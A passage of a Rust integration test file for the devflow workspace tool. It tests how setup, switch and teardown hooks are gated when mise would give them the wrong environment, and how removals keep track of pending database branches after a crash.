                "mise resolves COMPOSE_PROJECT_NAME from another source than .devflow/env"
            ) && detail.contains("mise.local.toml")
                && detail.contains("setup hook #1")
                && detail.contains("devflow exec")
                && detail.contains("skip this check"),
            "{name}: {detail}"
        );
        assert!(!detail.contains(MAIN), "no value: {detail}");
        assert_eq!(seen(&out.workspace), None, "{name}: no hook ran");
        assert!(out.hooks.is_none());

        // The escape hatch: the hook runs, and the receipt says nobody checked.
        let again = setup::setup(
            &t.project,
            &out.workspace,
            SetupOptions {
                skip_mise_check: true,
                ..no_db(&t.project)
            },
            false,
            false,
            &mut NoProgress,
        )
        .unwrap()
        .unwrap();
        assert_eq!(
            again.status,
            Status::Ready,
            "{name}: {:?}",
            again.receipt.phases
        );
        assert_eq!(seen(&out.workspace).as_deref(), Some(MAIN), "{name}");
        assert!(again.receipt.mise_check_skipped_at.is_some(), "{name}");
        assert!(
            again
                .warnings
                .iter()
                .any(|w| w.contains("skipped on request")),
            "{name}: {:?}",
            again.warnings
        );
        let stored = receipt_of(&out.workspace);
        assert!(stored.mise_check_skipped_at.is_some(), "{name}");
    }
}

#[test]
fn a_hook_routed_through_devflow_exec_runs_whatever_mise_sets() {
    // The generated shape: `mise exec -- devflow exec -- CMD`. devflow sets
    // the workspace's variables after mise, so no check is needed and the
    // command gets the workspace's own value, from a subdirectory too.
    const NAME: &str = "a_hook_routed_through_devflow_exec_runs_whatever_mise_sets";
    if !with_real_mise(NAME) {
        return;
    }
    for (hook, files) in [
        (ROUTED, vec![]),
        (
            "cd app && mise exec -- devflow exec -- sh ../seen.sh",
            vec![(
                "app/mise.toml",
                "[env]\nCOMPOSE_PROJECT_NAME = \"main-app\"\n",
            )],
        ),
    ] {
        let t = project_with_hook(hook, "", &files);
        // Everything that could override it does.
        commit_mise(
            &t,
            "[env]\n_.file = \".env\"\n",
            &[("mise.local.toml", "[env]\nCOMPOSE_PROJECT_NAME = false\n")],
        );
        let out = create(&t.project, "w", no_db(&t.project)).unwrap();
        assert_eq!(
            out.status,
            Status::Ready,
            "{hook}: {:?}",
            out.receipt.phases
        );
        let expected = env_map(&out.workspace)["COMPOSE_PROJECT_NAME"].clone();
        assert_ne!(expected, MAIN);
        assert_eq!(seen(&out.workspace), Some(expected), "{hook}");
        assert!(out.receipt.mise_check_skipped_at.is_none());
        // The copied `.env` sets what the workspace owns (that is what mise
        // loads here): setup says so, by name, and says nothing else.
        assert_eq!(out.warnings.len(), 1, "{hook}: {:?}", out.warnings);
        assert!(
            out.warnings[0].starts_with(".env sets COMPOSE_PROJECT_NAME"),
            "{hook}: {:?}",
            out.warnings
        );
    }
}

#[test]
fn review_final_c_a_generated_mise_env_selects_other_configuration() {
    // `[env] MISE_ENV = "production"` is injected into the hook, so
    // `mise exec` reads `mise.production.toml`. A check made without it
    // would have passed.
    const NAME: &str = "review_final_c_a_generated_mise_env_selects_other_configuration";
    if !with_real_mise(NAME) {
        return;
    }
    let production = (
        "mise.production.toml",
        "[env]\nCOMPOSE_PROJECT_NAME = \"main-production\"\n",
    );
    // Without MISE_ENV the file is not read.
    let t = project_with_hook(THROUGH_MISE, "", &[production]);
    commit_mise(&t, WIRED, &[]);
    let out = create(&t.project, "plain", no_db(&t.project)).unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    // With it, it is, and the hook is not run.
    let t = project_with_hook(
        THROUGH_MISE,
        "[env]\nMISE_ENV = \"production\"\n",
        &[production],
    );
    commit_mise(&t, WIRED, &[]);
    let out = create(&t.project, "selected", no_db(&t.project)).unwrap();
    assert_eq!(out.status, Status::NeedsAttention);
    let detail = hooks_record(&out).detail.unwrap();
    assert!(
        detail.contains("mise resolves COMPOSE_PROJECT_NAME")
            && !detail.contains("main-production"),
        "{detail}"
    );
    assert_eq!(seen(&out.workspace), None);
    // Routed through devflow exec, it runs, and gets the workspace's value.
    let t = project_with_hook(ROUTED, "[env]\nMISE_ENV = \"production\"\n", &[production]);
    commit_mise(&t, WIRED, &[]);
    let out = create(&t.project, "routed", no_db(&t.project)).unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert_eq!(
        seen(&out.workspace),
        Some(env_map(&out.workspace)["COMPOSE_PROJECT_NAME"].clone())
    );
}

#[test]
fn review_final_d_configuration_in_places_a_short_list_of_names_misses() {
    // No `mise.toml` at all: only `.config/mise/conf.d/a.toml`, or
    // `.config/mise/config.dev.toml` with MISE_ENV=dev. A check that began
    // with a list of file names did not run for these worktrees.
    const NAME: &str = "review_final_d_configuration_in_places_a_short_list_of_names_misses";
    if !with_real_mise(NAME) {
        return;
    }
    let overriding = "[env]\nCOMPOSE_PROJECT_NAME = \"main-elsewhere\"\n";
    for (label, extra, file) in [
        ("conf.d", "", ".config/mise/conf.d/a.toml"),
        (
            "environment-specific",
            "[env]\nMISE_ENV = \"dev\"\n",
            ".config/mise/config.dev.toml",
        ),
    ] {
        let t = project_with_hook(THROUGH_MISE, extra, &[(file, overriding)]);
        let out = create(&t.project, "w", no_db(&t.project)).unwrap();
        assert_eq!(out.status, Status::NeedsAttention, "{label}");
        let detail = hooks_record(&out).detail.unwrap();
        assert!(
            detail.contains("mise resolves COMPOSE_PROJECT_NAME")
                && detail.contains("setup hook #1"),
            "{label}: {detail}"
        );
        assert_eq!(seen(&out.workspace), None, "{label}");
    }
}

#[test]
fn review_final_e_a_variable_removed_by_mise_is_not_let_through() {
    // `[env] NAME = false` without loading `.devflow/env`: `mise env` shows
    // nothing (the file is not loaded, so the old check only warned), and
    // `mise exec` removes the variable devflow injected.
    const NAME: &str = "review_final_e_a_variable_removed_by_mise_is_not_let_through";
    if !with_real_mise(NAME) {
        return;
    }
    let t = project_with_hook(THROUGH_MISE, "", &[]);
    commit_mise(&t, "[env]\nCOMPOSE_PROJECT_NAME = false\n", &[]);
    let out = create(&t.project, "w", no_db(&t.project)).unwrap();
    assert_eq!(out.status, Status::NeedsAttention);
    let detail = hooks_record(&out).detail.unwrap();
    assert!(
        detail.contains("mise removes COMPOSE_PROJECT_NAME") && detail.contains("devflow exec"),
        "{detail}"
    );
    assert_eq!(seen(&out.workspace), None);
}

#[test]
fn review_final_a_and_b_hooks_the_check_cannot_stand_for_warn_instead_of_blocking() {
    // (a) `cd app && mise exec -- …` where `app/mise.toml` sets the main
    // database, and (b) a mise task whose own `env` sets it: the hook runs
    // and gets the main value, because a check at the worktree root cannot
    // tell. The gate says so, by hook, and recommends `devflow exec`.
    const NAME: &str =
        "review_final_a_and_b_hooks_the_check_cannot_stand_for_warn_instead_of_blocking";
    if !with_real_mise(NAME) {
        return;
    }
    for (label, hook, files, reason) in [
        (
            "a",
            "cd app && mise exec -- sh ../seen.sh",
            vec![
                (
                    "app/mise.toml",
                    "[env]\nCOMPOSE_PROJECT_NAME = \"main-app\"\n",
                ),
                ("mise.toml", WIRED),
            ],
            "changes directory before mise",
        ),
        (
            "b",
            "mise run seen",
            vec![(
                "mise.toml",
                "[env]\n_.file = \".devflow/env\"\n\n[tasks.seen]\nrun = \"sh seen.sh\"\n\n\
                 [tasks.seen.env]\nCOMPOSE_PROJECT_NAME = \"main-task\"\n",
            )],
            "runs a mise task",
        ),
    ] {
        let t = project_with_hook(hook, "", &files);
        let out = create(&t.project, "w", no_db(&t.project)).unwrap();
        assert_eq!(
            out.status,
            Status::Ready,
            "{label}: {:?}",
            out.receipt.phases
        );
        let warning = out
            .warnings
            .iter()
            .find(|w| w.contains("setup hook #1"))
            .unwrap_or_else(|| panic!("{label}: {:?}", out.warnings));
        assert!(
            warning.contains(reason) && warning.contains("devflow exec"),
            "{label}: {warning}"
        );
        assert!(
            !warning.contains("seen") && !warning.contains("app &&"),
            "no command text: {warning}"
        );
        // The hole is real: the hook got another value.
        assert_ne!(
            seen(&out.workspace),
            Some(env_map(&out.workspace)["COMPOSE_PROJECT_NAME"].clone()),
            "{label}"
        );
    }
}

#[test]
fn a_configuration_mise_does_not_trust_stops_the_hooks_and_is_never_trusted_for_the_user() {
    const NAME: &str =
        "a_configuration_mise_does_not_trust_stops_the_hooks_and_is_never_trusted_for_the_user";
    if std::env::var_os(CHILD).is_none() && !mise_installed() {
        eprintln!("skipped: mise is not installed");
        return;
    }
    let base = tempfile::tempdir().unwrap();
    let base_path = base.path().canonicalize().unwrap();
    std::fs::create_dir_all(base_path.join("tmp")).unwrap();
    // Trust covers some other directory: the repository is not trusted.
    let mut env = isolated_mise(&base_path);
    let elsewhere = base_path.join("elsewhere");
    std::fs::create_dir_all(&elsewhere).unwrap();
    for (key, value) in &mut env {
        if key == "MISE_TRUSTED_CONFIG_PATHS" {
            *value = elsewhere.display().to_string();
        }
    }
    let env: Vec<(&str, &str)> = env.iter().map(|(k, v)| (k.as_str(), v.as_str())).collect();
    if !in_child(NAME, &env) {
        return;
    }

    let t = project_with_hook(THROUGH_MISE, "", &[]);
    commit_mise(&t, WIRED, &[]);
    let out = create(&t.project, "w", no_db(&t.project)).unwrap();
    let hooks = hooks_record(&out);
    assert_eq!(out.status, Status::NeedsAttention, "{hooks:?}");
    let detail = hooks.detail.unwrap();
    assert!(detail.contains("mise trust "), "{detail}");
    assert!(
        detail.contains(&out.workspace.path.display().to_string()),
        "{detail}"
    );
    assert_eq!(seen(&out.workspace), None);
    // devflow trusted nothing on its own: mise still refuses it.
    let trust_state = std::process::Command::new("mise")
        .args(["trust", "--show"])
        .current_dir(&out.workspace.path)
        .output()
        .unwrap();
    assert!(
        String::from_utf8_lossy(&trust_state.stdout).contains("untrusted"),
        "{}",
        String::from_utf8_lossy(&trust_state.stdout)
    );
}

#[test]
fn a_missing_mise_stops_only_the_setup_hooks_that_run_it() {
    const NAME: &str = "a_missing_mise_stops_only_the_setup_hooks_that_run_it";
    // A PATH without mise (and without anything but the system tools).
    if ["/usr/bin/mise", "/bin/mise"]
        .iter()
        .any(|p| Path::new(p).exists())
    {
        eprintln!("skipped: mise is installed in a system directory");
        return;
    }
    if !in_child(NAME, &[("PATH", "/usr/bin:/bin")]) {
        return;
    }
    for (hook, blocked) in [
        ("echo ran >> .devflow/runs", false),
        ("mise exec -- true", true),
    ] {
        let t = repo(
            &Hooks {
                setup: &[hook, "echo second >> .devflow/runs"],
                ..Default::default()
            },
            "",
        );
        trust::approve(&t.project).unwrap();
        commit_mise(&t, "[tools]\n", &[]);
        let out = create(&t.project, "w", no_db(&t.project)).unwrap();
        let record = out.receipt.phase(Phase::Hooks);
        if blocked {
            assert_eq!(out.status, Status::NeedsAttention, "{hook}: {record:?}");
            assert!(
                record.detail.unwrap().contains("mise is not installed"),
                "{hook}"
            );
            assert!(!out.workspace.path.join(".devflow/runs").exists());
        } else {
            assert_eq!(out.status, Status::Ready, "{hook}: {record:?}");
            assert_eq!(
                std::fs::read_to_string(out.workspace.path.join(".devflow/runs"))
                    .unwrap()
                    .lines()
                    .count(),
                2
            );
        }
    }
}

// --- switch and teardown hooks get the gate setup hooks have ---------------------------

const DELIVERS: &str = "[env]\n_.file = \".devflow/env\"\n";
/// mise loads the main checkout's `.env` after `.devflow/env`, so it wins.
const OVERRIDES: &str = "[env]\n_.file = [\".devflow/env\", \".env\"]\n";
const SWITCHED: &str =
    "printf %s \"$COMPOSE_PROJECT_NAME\" > \"$DEVFLOW_WORKSPACE_PATH/.devflow/switched\"\n";
const TORN_DOWN: &str =
    "printf %s \"$COMPOSE_PROJECT_NAME\" > \"$DEVFLOW_WORKSPACE_PATH/../torn-down\"\n";

/// A project whose switch and teardown hooks both go through mise, the main
/// checkout's own `COMPOSE_PROJECT_NAME` in a `.env` that mise can load.
fn project_with_mise_hooks(mise: &str) -> Repo {
    let t = repo(
        &Hooks {
            switch: &["mise exec -- sh switched.sh"],
            teardown: &["mise exec -- sh torn-down.sh"],
            ..Default::default()
        },
        "",
    );
    std::fs::write(
        t.root.join(".env"),
        format!("COMPOSE_PROJECT_NAME={MAIN}\n"),
    )
    .unwrap();
    trust::approve(&t.project).unwrap();
    commit_mise(
        &t,
        mise,
        &[("switched.sh", SWITCHED), ("torn-down.sh", TORN_DOWN)],
    );
    t
}

fn switch_here(t: &Repo, w: &Workspace) -> SetupOutcome {
    setup::activate(&t.project, w, no_db(&t.project), &mut NoProgress).unwrap()
}

#[test]
fn switch_hooks_that_mise_would_not_hand_the_workspace_do_not_run() {
    const NAME: &str = "switch_hooks_that_mise_would_not_hand_the_workspace_do_not_run";
    if !with_real_mise(NAME) {
        return;
    }
    let t = project_with_mise_hooks(OVERRIDES);
    let w = create(&t.project, "w", no_db(&t.project))
        .unwrap()
        .workspace;
    let out = switch_here(&t, &w);
    assert!(out.switch_hooks.is_none(), "no hook ran");
    assert_eq!(
        std::fs::read_to_string(w.path.join(".devflow/switched")).ok(),
        None
    );
    let said = out.warnings.join("\n");
    assert!(
        said.contains("switch hooks were not run")
            && said.contains("switch hook #1")
            && said.contains("would not get the workspace's variables"),
        "{said}"
    );
    // A reason says what is wrong; the way on is the remedy below.
    assert!(
        !said.contains("devflow exec") && !said.contains("mise exec"),
        "{said}"
    );
    assert!(!said.contains(MAIN), "names, never values: {said}");
    assert!(
        out.remedies
            .iter()
            .any(|r| matches!(r, devflow_core::remedy::Remedy::OpenFile { .. })),
        "{:?}",
        out.remedies
    );
    // Setup itself was fine: the switch happened, the workspace is ready.
    assert_eq!(out.status, Status::Ready);

    // The escape hatch the setup hooks have: asked to skip, they run, and it is said.
    let out = setup::activate(
        &t.project,
        &w,
        SetupOptions {
            skip_mise_check: true,
            ..no_db(&t.project)
        },
        &mut NoProgress,
    )
    .unwrap();
    assert!(out.switch_hooks.is_some());
    assert!(
        out.warnings
            .iter()
            .any(|w| w.contains("skipped on request")),
        "{:?}",
        out.warnings
    );
}

#[test]
fn switch_hooks_that_mise_hands_the_workspace_run() {
    const NAME: &str = "switch_hooks_that_mise_hands_the_workspace_run";
    if !with_real_mise(NAME) {
        return;
    }
    let t = project_with_mise_hooks(DELIVERS);
    let w = create(&t.project, "w", no_db(&t.project))
        .unwrap()
        .workspace;
    let out = switch_here(&t, &w);
    assert!(out.switch_hooks.is_some(), "{:?}", out.warnings);
    assert!(out.warnings.is_empty(), "{:?}", out.warnings);
    assert_eq!(
        std::fs::read_to_string(w.path.join(".devflow/switched")).unwrap(),
        env_map(&w)["COMPOSE_PROJECT_NAME"]
    );
}

#[test]
fn teardown_hooks_that_mise_would_not_hand_the_workspace_refuse_the_removal_before_any_effect() {
    const NAME: &str = "teardown_hooks_that_mise_would_not_hand_the_workspace_refuse_the_removal_before_any_effect";
    if !with_real_mise(NAME) {
        return;
    }
    let t = project_with_mise_hooks(OVERRIDES);
    let w = create(&t.project, "w", no_db(&t.project))
        .unwrap()
        .workspace;
    let torn_down = w.path.parent().unwrap().join("torn-down");

    let error =
        setup::remove(&t.project, "w", RemoveOptions::default(), &mut NoProgress).unwrap_err();
    let protected = error
        .downcast_ref::<Protected>()
        .unwrap_or_else(|| panic!("{error:#}"));
    assert!(protected.forceable);
    assert!(
        protected.reason.contains("teardown hooks were not run")
            && protected.reason.contains("teardown hook #1")
            && protected
                .reason
                .contains("would not get the workspace's variables"),
        "{}",
        protected.reason
    );
    assert!(
        !protected.reason.contains("devflow exec") && !protected.reason.contains("--force"),
        "no command line: {}",
        protected.reason
    );
    assert!(!protected.reason.contains(MAIN), "{}", protected.reason);
    assert!(
        protected
            .remedies
            .iter()
            .any(|r| matches!(r, devflow_core::remedy::Remedy::OpenFile { .. })),
        "{:?}",
        protected.remedies
    );
    // Before any effect.
    assert!(w.path.is_dir() && !torn_down.exists());
    assert!(worktree::find(&t.project, "w").unwrap().is_some());

    // Forced, the hooks are left out (they would run against the wrong
    // database), and it is said.
    let out = setup::remove(
        &t.project,
        "w",
        RemoveOptions {
            force: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert!(
        out.warnings
            .iter()
            .any(|m| m.contains("teardown hooks were skipped")),
        "{:?}",
        out.warnings
    );
    assert!(out.hooks.is_none());
    assert!(!torn_down.exists());
    assert!(!w.path.exists());
}

#[test]
fn teardown_hooks_are_checked_when_the_generated_file_is_gone() {
    // The hooks' environment is built from the receipt, so a removal after
    // `.devflow/` was cleaned still runs approved teardown hooks through mise
    // with whatever mise does to it: the gate looks at that environment, not
    // at the file.
    const NAME: &str = "teardown_hooks_are_checked_when_the_generated_file_is_gone";
    if !with_real_mise(NAME) {
        return;
    }
    let t = project_with_mise_hooks(OVERRIDES);
    let w = create(&t.project, "w", no_db(&t.project))
        .unwrap()
        .workspace;
    std::fs::remove_dir_all(w.path.join(".devflow")).unwrap();
    let torn_down = w.path.parent().unwrap().join("torn-down");

    let error =
        setup::remove(&t.project, "w", RemoveOptions::default(), &mut NoProgress).unwrap_err();
    let protected = error
        .downcast_ref::<Protected>()
        .unwrap_or_else(|| panic!("{error:#}"));
    assert!(protected.forceable);
    assert!(
        protected.reason.contains("teardown hook #1")
            && protected
                .reason
                .contains("would not get the workspace's variables"),
        "{}",
        protected.reason
    );
    assert!(w.path.is_dir() && !torn_down.exists(), "before any effect");

    // Forced: removed without running them, and it says so.
    let out = setup::remove(
        &t.project,
        "w",
        RemoveOptions {
            force: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert!(
        out.warnings
            .iter()
            .any(|m| m.contains("teardown hooks were skipped")),
        "{:?}",
        out.warnings
    );
    assert!(!torn_down.exists() && !w.path.exists());
}

#[test]
fn teardown_hooks_that_mise_hands_the_workspace_run_on_removal() {
    const NAME: &str = "teardown_hooks_that_mise_hands_the_workspace_run_on_removal";
    if !with_real_mise(NAME) {
        return;
    }
    let t = project_with_mise_hooks(DELIVERS);
    let w = create(&t.project, "w", no_db(&t.project))
        .unwrap()
        .workspace;
    let expected = env_map(&w)["COMPOSE_PROJECT_NAME"].clone();
    let torn_down = w.path.parent().unwrap().join("torn-down");
    let out = setup::remove(&t.project, "w", RemoveOptions::default(), &mut NoProgress).unwrap();
    assert!(
        out.hooks.is_some() && out.warnings.is_empty(),
        "{:?}",
        out.warnings
    );
    assert_eq!(std::fs::read_to_string(torn_down).unwrap(), expected);
}

// --- a removal accounts for every branch the receipt names ---------------------------

const UNREACHABLE_SERVER: &str = "[services.db]\nengine = \"postgres\"\nmode = \"external\"\n\
     admin_url = \"postgres://prov:pw@127.0.0.1:1/postgres\"\n";

/// A workspace of a project whose server cannot be reached, set up without
/// data, with its receipt as a crash would have left it: a branch recorded as
/// about to be created for `service`, never bound. A teardown hook proves
/// whether anything ran.
fn crashed_creation(
    extra: &str,
    service: &str,
    engine: Option<devflow_core::config::Engine>,
) -> (Repo, Workspace, uuid::Uuid) {
    let t = repo(
        &Hooks {
            teardown: &["touch ../teardown-ran"],
            ..Default::default()
        },
        extra,
    );
    trust::approve(&t.project).unwrap();
    let w = create(&t.project, "w", no_db(&t.project))
        .unwrap()
        .workspace;
    let id = uuid::Uuid::new_v4();
    let mut receipt = receipt_of(&w);
    receipt.creating = Some(devflow_core::receipt::PendingBranch {
        service: service.into(),
        branch_id: id,
        engine,
        file: None,
    });
    receipt.save(&w.git_dir).unwrap();
    (t, w, id)
}

#[test]
fn a_branch_recorded_before_its_creation_stops_the_removal_when_it_cannot_be_looked_for() {
    // `remove` planned its drops from the bindings alone: a crash between the
    // creation and the binding, then a removal, leaked the branch for good.
    // The workspace's record in the ledger survives the receipt, so the removal
    // can stop before any effect and still be forced: the branch stays named.
    let (t, w, id) = crashed_creation(
        UNREACHABLE_SERVER,
        "db",
        Some(devflow_core::config::Engine::Postgres),
    );
    let ran = w.path.parent().unwrap().join("teardown-ran");
    let error =
        setup::remove(&t.project, "w", RemoveOptions::default(), &mut NoProgress).unwrap_err();
    let protected = error
        .downcast_ref::<Protected>()
        .unwrap_or_else(|| panic!("{error:#}"));
    assert!(protected.forceable, "{}", protected.reason);
    assert!(
        protected.reason.contains(&id.to_string())
            && protected
                .reason
                .contains("cannot reach the database server")
            && protected.reason.contains("service 'db'"),
        "{}",
        protected.reason
    );
    let kinds: Vec<&str> = protected
        .remedies
        .iter()
        .map(devflow_core::remedy::Remedy::kind)
        .collect();
    assert_eq!(kinds, ["setup", "reconcile_databases"], "{kinds:?}");
    // Before any effect: no teardown, the worktree and its receipt are there.
    assert!(!ran.exists() && w.path.is_dir());
    assert_eq!(
        receipt_of(&w).creating.map(|p| p.branch_id),
        Some(id),
        "the receipt still names the branch"
    );

    // Forced, the worktree and receipt go and the record keeps naming the branch.
    let out = setup::remove(
        &t.project,
        "w",
        RemoveOptions {
            force: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert!(!w.path.exists());
    assert_eq!(out.still_recorded.len(), 1, "{out:?}");
    assert!(out.still_recorded[0].contains(&id.to_string()));
    let records = devflow_core::ledger::list(&t.project.git_common_dir)
        .unwrap()
        .records;
    assert_eq!(records.len(), 1);
    assert!(records[0].resources.branches[0].pending);
    assert_eq!(records[0].resources.branches[0].id, id);
}

/// A workspace whose receipt says what a crash would have left: the creation of
/// a branch of service `db` begun on `recorded`, never bound, while `db` is
/// configured as `extra` says now.
fn pending_on_another_engine(
    extra: &str,
    recorded: devflow_core::config::Engine,
) -> (Repo, Workspace, uuid::Uuid) {
    let t = repo(&Hooks::default(), extra);
    let w = worktree::create(&t.project, "w", None).unwrap();
    let id = uuid::Uuid::new_v4();
    let mut receipt = Receipt::new(t.project.id(), "w", None);
    receipt.set_phase(Phase::Materialize, PhaseState::Done, Some("made".into()));
    receipt.creating = Some(devflow_core::receipt::PendingBranch {
        service: "db".into(),
        branch_id: id,
        engine: Some(recorded),
        file: None,
    });
    receipt.save(&w.git_dir).unwrap();
    (t, w, id)
}

#[test]
fn setup_and_activation_keep_a_pending_branch_of_another_engine_unresolved() {
    use devflow_core::config::Engine;
    use devflow_core::remedy::Remedy;
    // The PostgreSQL creation succeeded, devflow crashed before binding it,
    // and `services.db` is a Valkey service now. Setup (and activation, which
    // runs it) with `--data-from empty` used to take the identity of the
    // PostgreSQL branch for a Valkey one and overwrite the intent, after which
    // a removal could no longer account for the PostgreSQL branch.
    for (extra, recorded) in [
        ("[services.db]\nengine = \"valkey\"\n", Engine::Postgres),
        (MANAGED, Engine::Valkey),
    ] {
        let (t, w, id) = pending_on_another_engine(extra, recorded);
        let options = || SetupOptions {
            data_from: Some(DataSource::Empty),
            ..Default::default()
        };
        let errors = [
            setup::setup(&t.project, &w, options(), false, false, &mut NoProgress).unwrap_err(),
            setup::activate(&t.project, &w, options(), &mut NoProgress).unwrap_err(),
        ];
        for error in errors {
            let said = format!("{error:#}");
            assert!(
                said.contains(&id.to_string()) && said.contains("unresolved"),
                "{said}"
            );
            // Typed: the ways on are remedies, not wording.
            let remedies = devflow_core::remedy::remedies_of(&error);
            let kinds: Vec<&str> = remedies.iter().map(Remedy::kind).collect();
            assert_eq!(
                kinds,
                [
                    if recorded == Engine::Postgres {
                        "reconcile_databases"
                    } else {
                        "reconcile_service"
                    },
                    "remove_workspace",
                    "open_file",
                    "setup"
                ],
                "{said}"
            );
            // The intent is exactly what it was: same branch, same backend.
            let kept = receipt_of(&w).creating.expect("the intent is kept");
            assert_eq!((kept.branch_id, kept.engine), (id, Some(recorded)));
            assert!(receipt_of(&w).services.is_empty(), "nothing was bound");
        }
        // And a removal still accounts for it: it looks in the recorded
        // backend, and the project has no PostgreSQL server to ask any more,
        // so it stops before any effect, naming the branch. The workspace's
        // record in the ledger survives the receipt, so (W2-A) forcing is
        // possible: the branch stays named, with its backend, for `gc`.
        // (The other direction asks the container catalog, which needs
        // Docker; not here.)
        if recorded == Engine::Postgres {
            let removal = setup::remove(&t.project, "w", RemoveOptions::default(), &mut NoProgress)
                .unwrap_err();
            let protected = removal
                .downcast_ref::<Protected>()
                .unwrap_or_else(|| panic!("{removal:#}"));
            assert!(protected.forceable && protected.reason.contains(&id.to_string()));
            assert!(w.path.is_dir(), "nothing was touched");
            let forced = setup::remove(
                &t.project,
                "w",
                RemoveOptions {
                    force: true,
                    ..Default::default()
                },
                &mut NoProgress,
            )
            .unwrap();
            assert!(
                forced
                    .still_recorded
                    .iter()
                    .any(|r| r.contains(&id.to_string())),
                "{forced:?}"
            );
            let kept = devflow_core::ledger::list(&t.project.git_common_dir)
                .unwrap()
                .records
                .into_iter()
                .flat_map(|record| record.resources.branches)
                .find(|branch| branch.id == id)
                .expect("the record keeps naming the branch");
            assert_eq!((kept.pending, kept.engine), (true, Some(Engine::Postgres)));
        }
    }
}

const ATTACH: &str = "postgres://dfl_x:pw@db.internal:6543/df_proj_x"; // kingfisher:ignore

/// Setup and activation, each with `--database-url`, on a workspace whose
/// receipt holds the creation `pending`, begun and never bound.
fn attach_with_pending(
    extra: &str,
    pending: devflow_core::receipt::PendingBranch,
) -> (Repo, Workspace, [anyhow::Result<()>; 2]) {
    let t = repo(&Hooks::default(), extra);
    let w = worktree::create(&t.project, "w", None).unwrap();
    let mut receipt = Receipt::new(t.project.id(), "w", None);
    receipt.set_phase(Phase::Materialize, PhaseState::Done, Some("made".into()));
    receipt.creating = Some(pending);
    receipt.save(&w.git_dir).unwrap();
    let options = || SetupOptions {
        database_url: Some(ATTACH.into()),
        ..Default::default()
    };
    let results = [
        setup::setup(&t.project, &w, options(), false, false, &mut NoProgress).map(|_| ()),
        setup::activate(&t.project, &w, options(), &mut NoProgress).map(|_| ()),
    ];
    (t, w, results)
}

/// What the workspace's record in the ledger (which outlives the receipt)
/// says about the branch `id`.
fn recorded_branch(t: &Repo, id: uuid::Uuid) -> Option<devflow_core::ledger::BranchRef> {
    devflow_core::ledger::list(&t.project.git_common_dir)
        .unwrap()
        .records
        .into_iter()
        .flat_map(|record| record.resources.branches)
        .find(|branch| branch.id == id)
}

#[test]
fn another_service_cannot_erase_a_pending_intent_before_its_own_guard() {
    use devflow_core::config::Engine;
    use devflow_core::receipt::PendingBranch;
    // `db` has an unresolved PostgreSQL creation and is a Valkey service now;
    // a PostgreSQL service `aaa`, which sorts before it, was added. Resuming
    // with `--database-url` attached `aaa` first, and its binding cleared the
    // intent before `db` reached its guard: a removal could then no longer
    // account for the original branch. The intent is looked at before any
    // service is touched.
    let id = uuid::Uuid::new_v4();
    let pending = PendingBranch {
        service: "db".into(),
        branch_id: id,
        engine: Some(Engine::Postgres),
        file: None,
    };
    let (t, w, results) = attach_with_pending(
        "[services.aaa]\nengine = \"postgres\"\n\n[services.db]\nengine = \"valkey\"\n",
        pending,
    );
    for (how, result) in ["setup", "activation"].into_iter().zip(results) {
        let error = result.expect_err(how);
        let said = format!("{error:#}");
        assert!(
            said.contains(&id.to_string()) && said.contains("unresolved"),
            "{how}: {said}"
        );
        let kinds: Vec<&str> = devflow_core::remedy::remedies_of(&error)
            .iter()
            .map(devflow_core::remedy::Remedy::kind)
            .collect();
        assert_eq!(
            kinds,
            [
                "reconcile_databases",
                "remove_workspace",
                "open_file",
                "setup"
            ],
            "{how}: {said}"
        );
        // Nothing was touched: `aaa` is not attached, the intent is as it was.
        let after = receipt_of(&w);
        assert!(after.services.is_empty(), "{how}: {:?}", after.services);
        let kept = after.creating.expect("the intent is kept");
        assert_eq!(
            (kept.service.as_str(), kept.branch_id, kept.engine),
            ("db", id, Some(Engine::Postgres)),
            "{how}"
        );
        // The workspace's record, which outlives the receipt, still lists the
        // branch as pending on the backend it was begun on.
        let listed = recorded_branch(&t, id).unwrap_or_else(|| panic!("{how}: not recorded"));
        assert_eq!(
            (listed.pending, listed.engine, listed.service.as_deref()),
            (true, Some(Engine::Postgres), Some("db")),
            "{how}"
        );
    }
}

#[test]
fn a_pending_intent_stays_on_the_workspace_record_through_a_forced_removal() {
    use devflow_core::config::Engine;
    use devflow_core::receipt::PendingBranch;
    // The same scenario, with the PostgreSQL service `aaa` pointing at a
    // server nobody can reach: resuming with `--database-url` is refused, a
    // plain removal stops before any effect and names the branch, and
    // forcing it leaves the branch named, with its backend, on the record
    // (W2-A) for `gc`, not in a receipt that goes with the worktree.
    let id = uuid::Uuid::new_v4();
    let extra = format!(
        "{}\n[services.db]\nengine = \"valkey\"\n",
        UNREACHABLE_SERVER.replace("[services.db]", "[services.aaa]")
    );
    let (t, w, results) = attach_with_pending(
        &extra,
        PendingBranch {
            service: "db".into(),
            branch_id: id,
            engine: Some(Engine::Postgres),
            file: None,
        },
    );
    for (how, result) in ["setup", "activation"].into_iter().zip(results) {
        let said = format!("{:#}", result.expect_err(how));
        assert!(
            said.contains(&id.to_string()) && said.contains("unresolved"),
            "{how}: {said}"
        );
        assert!(
            receipt_of(&w).services.is_empty(),
            "{how}: aaa was attached"
        );
        assert_eq!(
            receipt_of(&w).creating.map(|p| p.branch_id),
            Some(id),
            "{how}"
        );
    }
    assert_eq!(
        recorded_branch(&t, id).map(|b| (b.pending, b.engine)),
        Some((true, Some(Engine::Postgres)))
    );

    let error =
        setup::remove(&t.project, "w", RemoveOptions::default(), &mut NoProgress).unwrap_err();
    let protected = error
        .downcast_ref::<Protected>()
        .unwrap_or_else(|| panic!("{error:#}"));
    assert!(protected.forceable && protected.reason.contains(&id.to_string()));
    assert!(w.path.is_dir(), "nothing was touched");

    let forced = setup::remove(
        &t.project,
        "w",
        RemoveOptions {
            force: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert!(
        forced
            .still_recorded
            .iter()
            .any(|r| r.contains(&id.to_string())),
        "{forced:?}"
    );
    assert!(!w.path.exists());
    let kept = recorded_branch(&t, id).expect("the record keeps naming the branch");
    assert_eq!(
        (kept.pending, kept.engine, kept.service.as_deref()),
        (true, Some(Engine::Postgres), Some("db"))
    );
}

#[test]
fn a_pending_intent_of_a_service_no_longer_configured_stops_the_others() {
    use devflow_core::config::Engine;
    use devflow_core::receipt::PendingBranch;
    // The intent is the only evidence that the branch was made; with one slot,
